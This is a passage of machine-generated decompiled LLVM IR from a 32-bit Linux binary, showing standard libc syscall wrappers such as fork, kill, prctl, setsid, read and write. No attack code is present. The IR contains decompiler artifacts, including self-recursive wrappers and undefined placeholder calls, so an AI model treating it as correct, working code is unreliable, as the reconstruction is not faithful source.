  uselistorder label %dec_label_pc_8051564, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805156c = load i32, i32* @ebx, align 4
  store i32 %v0_805156c, i32* %stack_var_-4, align 4
  %v1_8051575 = call i32 @fork(i32 %v0_805156c)
  store i32 %v1_8051575, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8051575, -4095
  br i1 %tmp6, label %dec_label_pc_805158c, label %dec_label_pc_8051580

dec_label_pc_8051580:                             ; preds = %entry
  %v0_8051580 = load i32, i32* %stack_var_-4, align 4
  %v1_8051580 = call i32 @__errno_location(i32 %v0_8051580)
  %v0_8051585 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051585 = sub i32 0, %v0_8051585
  %v2_8051587 = inttoptr i32 %v1_8051580 to i32*
  store i32 %v1_8051585, i32* %v2_8051587, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805158c

dec_label_pc_805158c:                             ; preds = %entry, %dec_label_pc_8051580
  %v0_805158c = phi i32 [ %v1_8051575, %entry ], [ -1, %dec_label_pc_8051580 ]
  %v2_805158e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805158e, i32* @edx, align 4
  %v2_8051590 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051590, i32* @ebx, align 4
  ret i32 %v0_805158c

; uselistorder directives
  uselistorder i32 %v1_8051575, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805158c, { 1, 0 }
}

define i32 @getdtablesize(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8051597 = ptrtoint i32* %stack_var_-8 to i32
  %v2_805159e = call i32 @getrlimit(i32 7, i32 %v2_8051597)
  store i32 256, i32* @edx, align 4
  %v2_80515ab = icmp slt i32 %v2_805159e, 0
  br i1 %v2_80515ab, label %dec_label_pc_80515b3, label %dec_label_pc_80515af

dec_label_pc_80515af:                             ; preds = %entry
  %v3_80515af = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_80515af, i32* @edx, align 4
  br label %dec_label_pc_80515b3

dec_label_pc_80515b3:                             ; preds = %entry, %dec_label_pc_80515af
  %v0_80515b3 = phi i32 [ 256, %entry ], [ %v3_80515af, %dec_label_pc_80515af ]
  ret i32 %v0_80515b3

; uselistorder directives
  uselistorder label %dec_label_pc_80515b3, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80515bc = load i32, i32* @ebx, align 4
  store i32 %v0_80515bc, i32* %stack_var_-4, align 4
  %v1_80515c5 = call i32 @int80_syscall(i32 201)
  store i32 %v1_80515c5, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_80515c5, -4095
  br i1 %tmp6, label %dec_label_pc_80515dc, label %dec_label_pc_80515d0

dec_label_pc_80515d0:                             ; preds = %entry
  %v0_80515d0 = load i32, i32* %stack_var_-4, align 4
  %v1_80515d0 = call i32 @__errno_location(i32 %v0_80515d0)
  %v0_80515d5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80515d5 = sub i32 0, %v0_80515d5
  %v2_80515d7 = inttoptr i32 %v1_80515d0 to i32*
  store i32 %v1_80515d5, i32* %v2_80515d7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80515dc

dec_label_pc_80515dc:                             ; preds = %entry, %dec_label_pc_80515d0
  %v0_80515dc = phi i32 [ %v1_80515c5, %entry ], [ -1, %dec_label_pc_80515d0 ]
  %v2_80515e0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80515e0, i32* @ebx, align 4
  ret i32 %v0_80515dc

; uselistorder directives
  uselistorder i32 %v1_80515c5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 201, { 1, 0 }
  uselistorder label %dec_label_pc_80515dc, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80515e4 = load i32, i32* @ebx, align 4
  store i32 %v0_80515e4, i32* %stack_var_-4, align 4
  %v1_80515ed = call i32 @getpid(i32 %v0_80515e4)
  store i32 %v1_80515ed, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_80515ed, -4095
  br i1 %tmp6, label %dec_label_pc_8051604, label %dec_label_pc_80515f8

dec_label_pc_80515f8:                             ; preds = %entry
  %v0_80515f8 = load i32, i32* %stack_var_-4, align 4
  %v1_80515f8 = call i32 @__errno_location(i32 %v0_80515f8)
  %v0_80515fd = load i32, i32* %ebx.global-to-local, align 4
  %v1_80515fd = sub i32 0, %v0_80515fd
  %v2_80515ff = inttoptr i32 %v1_80515f8 to i32*
  store i32 %v1_80515fd, i32* %v2_80515ff, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051604

dec_label_pc_8051604:                             ; preds = %entry, %dec_label_pc_80515f8
  %v0_8051604 = phi i32 [ %v1_80515ed, %entry ], [ -1, %dec_label_pc_80515f8 ]
  %v2_8051608 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051608, i32* @ebx, align 4
  ret i32 %v0_8051604

; uselistorder directives
  uselistorder i32 %v1_80515ed, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051604, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805160c = load i32, i32* @ebx, align 4
  store i32 %v0_805160c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_805161f = call i32 @int80_syscall(i32 191)
  store i32 %v1_805161f, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_805161f, -4095
  br i1 %tmp8, label %dec_label_pc_8051638, label %dec_label_pc_805162c

dec_label_pc_805162c:                             ; preds = %entry
  %v0_805162c = load i32, i32* %stack_var_-4, align 4
  %v1_805162c = call i32 @__errno_location(i32 %v0_805162c)
  %v0_8051631 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051631 = sub i32 0, %v0_8051631
  %v2_8051633 = inttoptr i32 %v1_805162c to i32*
  store i32 %v1_8051631, i32* %v2_8051633, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051638

dec_label_pc_8051638:                             ; preds = %entry, %dec_label_pc_805162c
  %v0_8051638 = phi i32 [ %v1_805161f, %entry ], [ -1, %dec_label_pc_805162c ]
  %v2_805163c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805163c, i32* @ebx, align 4
  ret i32 %v0_8051638

; uselistorder directives
  uselistorder i32 %v1_805161f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 191, { 1, 0 }
  uselistorder label %dec_label_pc_8051638, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051640 = load i32, i32* @edi, align 4
  store i32 %v0_8051640, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8051658 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8051660 = call i32 @ioctl(i32 %v0_8051658, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8051658, i32* @ebx, align 4
  store i32 %v3_8051660, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v3_8051660, -4095
  br i1 %tmp11, label %dec_label_pc_8051678, label %dec_label_pc_805166c

dec_label_pc_805166c:                             ; preds = %entry
  %v1_805166c = call i32 @__errno_location(i32 %v0_8051658)
  %v0_8051671 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051671 = sub i32 0, %v0_8051671
  %v2_8051673 = inttoptr i32 %v1_805166c to i32*
  store i32 %v1_8051671, i32* %v2_8051673, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051678

dec_label_pc_8051678:                             ; preds = %entry, %dec_label_pc_805166c
  %v0_8051678 = phi i32 [ %v3_8051660, %entry ], [ -1, %dec_label_pc_805166c ]
  %v2_805167d = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805167d, i32* @edi, align 4
  ret i32 %v0_8051678

; uselistorder directives
  uselistorder i32 %v3_8051660, { 1, 0, 2 }
  uselistorder i32 %v0_8051658, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051678, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051680 = load i32, i32* @ebx, align 4
  store i32 %v0_8051680, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8051693 = call i32 @kill(i32 %v0_8051680, i32 %tmp4)
  store i32 %v2_8051693, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_8051693, -4095
  br i1 %tmp8, label %dec_label_pc_80516ac, label %dec_label_pc_80516a0

dec_label_pc_80516a0:                             ; preds = %entry
  %v0_80516a0 = load i32, i32* %stack_var_-4, align 4
  %v1_80516a0 = call i32 @__errno_location(i32 %v0_80516a0)
  %v0_80516a5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80516a5 = sub i32 0, %v0_80516a5
  %v2_80516a7 = inttoptr i32 %v1_80516a0 to i32*
  store i32 %v1_80516a5, i32* %v2_80516a7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80516ac

dec_label_pc_80516ac:                             ; preds = %entry, %dec_label_pc_80516a0
  %v0_80516ac = phi i32 [ %v2_8051693, %entry ], [ -1, %dec_label_pc_80516a0 ]
  %v2_80516ae = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80516ae, i32* @edx, align 4
  %v2_80516b0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80516b0, i32* @ebx, align 4
  ret i32 %v0_80516ac

; uselistorder directives
  uselistorder i32 %v2_8051693, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80516ac, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_80516b5 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_80516bb = sdiv i32 %sext, 16777216
  store i32 %v4_80516bb, i32* @ecx, align 4
  %v4_80516bf = ptrtoint i8* %arg1 to i32
  %v3_80516c3 = and i32 %arg2, 64
  %v4_80516c3 = icmp eq i32 %v3_80516c3, 0
  br i1 %v4_80516c3, label %dec_label_pc_80516d4, label %dec_label_pc_80516c8

dec_label_pc_80516c8:                             ; preds = %entry
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_80516d4

dec_label_pc_80516d4:                             ; preds = %entry, %dec_label_pc_80516c8
  %v0_80516d4 = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_80516c8 ]
  store i32 %v0_80516d4, i32* @edx, align 4
  store i32 %v4_80516bf, i32* %ebx.global-to-local, align 4
  %v5_80516df = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_80516bb)
  store i32 %v5_80516df, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_80516df, -4095
  br i1 %tmp15, label %dec_label_pc_80516f7, label %dec_label_pc_80516eb

dec_label_pc_80516eb:                             ; preds = %dec_label_pc_80516d4
  %v1_80516eb = call i32 @__errno_location(i32 %v0_80516b5)
  %v0_80516f0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80516f0 = sub i32 0, %v0_80516f0
  %v2_80516f2 = inttoptr i32 %v1_80516eb to i32*
  store i32 %v1_80516f0, i32* %v2_80516f2, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80516f7

dec_label_pc_80516f7:                             ; preds = %dec_label_pc_80516d4, %dec_label_pc_80516eb
  %v0_80516f7 = phi i32 [ %v5_80516df, %dec_label_pc_80516d4 ], [ -1, %dec_label_pc_80516eb ]
  store i32 %v0_80516b5, i32* @ebx, align 4
  ret i32 %v0_80516f7

; uselistorder directives
  uselistorder i32 %v5_80516df, { 1, 0, 2 }
  uselistorder i32 %v4_80516bb, { 1, 0 }
  uselistorder i32 %v0_80516b5, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80516f7, { 1, 0 }
  uselistorder label %dec_label_pc_80516d4, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_805170f = inttoptr i32 %arg1 to i8*
  %v4_805170f = call i32 @__libc_open(i8* %v3_805170f, i32 577)
  ret i32 %v4_805170f
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051718 = load i32, i32* @edi, align 4
  store i32 %v0_8051718, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8051720 = load i32, i32* @ebx, align 4
  %v1_8051728 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_8051728 = call i32 @pipe([2 x i32] %v1_8051728)
  store i32 %v0_8051720, i32* @ebx, align 4
  store i32 %v2_8051728, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_8051728, -4095
  br i1 %tmp8, label %dec_label_pc_8051740, label %dec_label_pc_8051734

dec_label_pc_8051734:                             ; preds = %entry
  %v1_8051734 = call i32 @__errno_location(i32 %v0_8051720)
  %v0_8051739 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051739 = sub i32 0, %v0_8051739
  %v2_805173b = inttoptr i32 %v1_8051734 to i32*
  store i32 %v1_8051739, i32* %v2_805173b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051740

dec_label_pc_8051740:                             ; preds = %entry, %dec_label_pc_8051734
  %v0_8051740 = phi i32 [ %v2_8051728, %entry ], [ -1, %dec_label_pc_8051734 ]
  %v2_8051744 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051744, i32* @edi, align 4
  ret i32 %v0_8051740

; uselistorder directives
  uselistorder i32 %v2_8051728, { 1, 0, 2 }
  uselistorder i32 %v0_8051720, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051740, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8051748 = load i32, i32* @edi, align 4
  %v0_8051749 = load i32, i32* @esi, align 4
  store i32 %v0_8051749, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_8051761 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v5_8051769 = call i32 @prctl(i32 %v0_8051761, i32 %v0_8051749, i32 %v0_8051748, i32 %tmp6, i32 %arg1)
  store i32 %v0_8051761, i32* @ebx, align 4
  store i32 %v5_8051769, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v5_8051769, -4095
  br i1 %tmp11, label %dec_label_pc_8051781, label %dec_label_pc_8051775

dec_label_pc_8051775:                             ; preds = %entry
  %v1_8051775 = call i32 @__errno_location(i32 %v0_8051761)
  %v0_805177a = load i32, i32* %esi.global-to-local, align 4
  %v1_805177a = sub i32 0, %v0_805177a
  %v2_805177c = inttoptr i32 %v1_8051775 to i32*
  store i32 %v1_805177a, i32* %v2_805177c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051781

dec_label_pc_8051781:                             ; preds = %entry, %dec_label_pc_8051775
  %v0_8051781 = phi i32 [ %v5_8051769, %entry ], [ -1, %dec_label_pc_8051775 ]
  %v2_8051784 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051784, i32* @esi, align 4
  store i32 %v0_8051748, i32* @edi, align 4
  ret i32 %v0_8051781

; uselistorder directives
  uselistorder i32 %v5_8051769, { 1, 0, 2 }
  uselistorder i32 %v0_8051761, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @prctl, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051781, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051788 = load i32, i32* @edi, align 4
  store i32 %v0_8051788, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8051798 = load i32, i32* @ebx, align 4
  %v4_80517a0 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8051798, i32* @ebx, align 4
  store i32 %v4_80517a0, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_80517a0, -4095
  br i1 %tmp11, label %dec_label_pc_80517b8, label %dec_label_pc_80517ac

dec_label_pc_80517ac:                             ; preds = %entry
  %v1_80517ac = call i32 @__errno_location(i32 %v0_8051798)
  %v0_80517b1 = load i32, i32* %edi.global-to-local, align 4
  %v1_80517b1 = sub i32 0, %v0_80517b1
  %v2_80517b3 = inttoptr i32 %v1_80517ac to i32*
  store i32 %v1_80517b1, i32* %v2_80517b3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80517b8

dec_label_pc_80517b8:                             ; preds = %entry, %dec_label_pc_80517ac
  %v0_80517b8 = phi i32 [ %v4_80517a0, %entry ], [ -1, %dec_label_pc_80517ac ]
  %v2_80517bc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80517bc, i32* @edi, align 4
  ret i32 %v0_80517b8

; uselistorder directives
  uselistorder i32 %v4_80517a0, { 1, 0, 2 }
  uselistorder i32 %v0_8051798, { 1, 0 }
  uselistorder label %dec_label_pc_80517b8, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80517c1 = load i32, i32* @esi, align 4
  store i32 %v0_80517c1, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_80517d9 = load i32, i32* @ebx, align 4
  %v1_80517e1 = call i32 @int80_syscall(i32 142)
  store i32 %v0_80517d9, i32* @ebx, align 4
  store i32 %v1_80517e1, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_80517e1, -4095
  br i1 %tmp11, label %dec_label_pc_80517f9, label %dec_label_pc_80517ed

dec_label_pc_80517ed:                             ; preds = %entry
  %v1_80517ed = call i32 @__errno_location(i32 %v0_80517d9)
  %v0_80517f2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80517f2 = sub i32 0, %v0_80517f2
  %v2_80517f4 = inttoptr i32 %v1_80517ed to i32*
  store i32 %v1_80517f2, i32* %v2_80517f4, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80517f9

dec_label_pc_80517f9:                             ; preds = %entry, %dec_label_pc_80517ed
  %v0_80517f9 = phi i32 [ %v1_80517e1, %entry ], [ -1, %dec_label_pc_80517ed ]
  %v2_80517fb = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80517fb, i32* @edx, align 4
  %v2_80517fc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80517fc, i32* @esi, align 4
  ret i32 %v0_80517f9

; uselistorder directives
  uselistorder i32 %v1_80517e1, { 1, 0, 2 }
  uselistorder i32 %v0_80517d9, { 1, 0 }
  uselistorder i32 142, { 1, 0 }
  uselistorder label %dec_label_pc_80517f9, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051800 = load i32, i32* @ebx, align 4
  store i32 %v0_8051800, i32* %stack_var_-4, align 4
  %v1_8051809 = call i32 @setsid(i32 %v0_8051800)
  store i32 %v1_8051809, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8051809, -4095
  br i1 %tmp6, label %dec_label_pc_8051820, label %dec_label_pc_8051814

dec_label_pc_8051814:                             ; preds = %entry
  %v0_8051814 = load i32, i32* %stack_var_-4, align 4
  %v1_8051814 = call i32 @__errno_location(i32 %v0_8051814)
  %v0_8051819 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051819 = sub i32 0, %v0_8051819
  %v2_805181b = inttoptr i32 %v1_8051814 to i32*
  store i32 %v1_8051819, i32* %v2_805181b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051820

dec_label_pc_8051820:                             ; preds = %entry, %dec_label_pc_8051814
  %v0_8051820 = phi i32 [ %v1_8051809, %entry ], [ -1, %dec_label_pc_8051814 ]
  %v2_8051824 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051824, i32* @ebx, align 4
  ret i32 %v0_8051820

; uselistorder directives
  uselistorder i32 %v1_8051809, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051820, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_8051829 = load i32, i32* @esi, align 4
  %v4_805182d = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_805182d, i32* @ecx, align 4
  %v2_8051839 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_8051839, label %dec_label_pc_8051852, label %dec_label_pc_805183d

dec_label_pc_805183d:                             ; preds = %entry
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_8051852, label %dec_label_pc_8051842

dec_label_pc_8051842:                             ; preds = %dec_label_pc_805183d
  %v1_8051842 = call i32 @__errno_location(i32 %v0_8051829)
  %v1_8051847 = inttoptr i32 %v1_8051842 to i32*
  store i32 22, i32* %v1_8051847, align 4
  br label %dec_label_pc_8051879

dec_label_pc_8051852:                             ; preds = %dec_label_pc_805183d, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_8051857 = load i32, i32* @ebx, align 4
  %v7_805185f = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_8051857, i32* @ebx, align 4
  store i32 %v7_805185f, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_805185f, -4095
  br i1 %tmp12, label %dec_label_pc_8051879, label %dec_label_pc_805186b

dec_label_pc_805186b:                             ; preds = %dec_label_pc_8051852
  %v1_805186b = call i32 @__errno_location(i32 %v0_8051857)
  %v0_8051870 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051870 = sub i32 0, %v0_8051870
  %v2_8051872 = inttoptr i32 %v1_805186b to i32*
  store i32 %v1_8051870, i32* %v2_8051872, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051879

dec_label_pc_8051879:                             ; preds = %dec_label_pc_805186b, %dec_label_pc_8051852, %dec_label_pc_8051842
  %storemerge = phi i32 [ -1, %dec_label_pc_8051842 ], [ %v7_805185f, %dec_label_pc_8051852 ], [ -1, %dec_label_pc_805186b ]
  %v2_8051879 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051879, i32* @edx, align 4
  store i32 %v0_8051829, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_805185f, { 1, 0, 2 }
  uselistorder i32 %v0_8051857, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051880 = load i32, i32* @edi, align 4
  store i32 %v0_8051880, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_8051888 = load i32, i32* @ebx, align 4
  %v2_8051890 = call i32 @time(i32* %arg1)
  store i32 %v0_8051888, i32* @ebx, align 4
  store i32 %v2_8051890, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_8051890, -4095
  br i1 %tmp9, label %dec_label_pc_80518a8, label %dec_label_pc_805189c

dec_label_pc_805189c:                             ; preds = %entry
  %v1_805189c = call i32 @__errno_location(i32 %v0_8051888)
  %v0_80518a1 = load i32, i32* %edi.global-to-local, align 4
  %v1_80518a1 = sub i32 0, %v0_80518a1
  %v2_80518a3 = inttoptr i32 %v1_805189c to i32*
  store i32 %v1_80518a1, i32* %v2_80518a3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80518a8

dec_label_pc_80518a8:                             ; preds = %entry, %dec_label_pc_805189c
  %v0_80518a8 = phi i32 [ %v2_8051890, %entry ], [ -1, %dec_label_pc_805189c ]
  %v2_80518aa = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80518aa, i32* @edx, align 4
  %v2_80518ac = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80518ac, i32* @edi, align 4
  ret i32 %v0_80518a8

; uselistorder directives
  uselistorder i32 %v2_8051890, { 1, 0, 2 }
  uselistorder i32 %v0_8051888, { 1, 0 }
  uselistorder label %dec_label_pc_80518a8, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_80518c1 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_80518c1
}

define i32 @__libc_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80518cc = load i32, i32* @edi, align 4
  store i32 %v0_80518cc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_80518dc = load i32, i32* @ebx, align 4
  %v4_80518e4 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_80518dc, i32* @ebx, align 4
  store i32 %v4_80518e4, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_80518e4, -4095
  br i1 %tmp11, label %dec_label_pc_80518fc, label %dec_label_pc_80518f0

dec_label_pc_80518f0:                             ; preds = %entry
  %v1_80518f0 = call i32 @__errno_location(i32 %v0_80518dc)
  %v0_80518f5 = load i32, i32* %edi.global-to-local, align 4
  %v1_80518f5 = sub i32 0, %v0_80518f5
  %v2_80518f7 = inttoptr i32 %v1_80518f0 to i32*
  store i32 %v1_80518f5, i32* %v2_80518f7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80518fc

dec_label_pc_80518fc:                             ; preds = %entry, %dec_label_pc_80518f0
  %v0_80518fc = phi i32 [ %v4_80518e4, %entry ], [ -1, %dec_label_pc_80518f0 ]
  %v2_80518fe = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80518fe, i32* @edx, align 4
  %v2_8051900 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051900, i32* @edi, align 4
  ret i32 %v0_80518fc

; uselistorder directives
  uselistorder i32 %v4_80518e4, { 1, 0, 2 }
  uselistorder i32 %v0_80518dc, { 1, 0 }
  uselistorder label %dec_label_pc_80518fc, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8051908 = load i32, i32* inttoptr (i32 134608412 to i32*), align 4
  %v2_805190d = mul i32 %arg1, 2
  %v3_805190d = add i32 %v0_8051908, %v2_805190d
  %v4_805190d = inttoptr i32 %v3_805190d to i16*
  %v5_805190d = load i16, i16* %v4_805190d, align 2
  %v6_805190d = zext i16 %v5_805190d to i32
  %v1_8051911 = and i32 %v6_805190d, 32
  ret i32 %v1_8051911
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
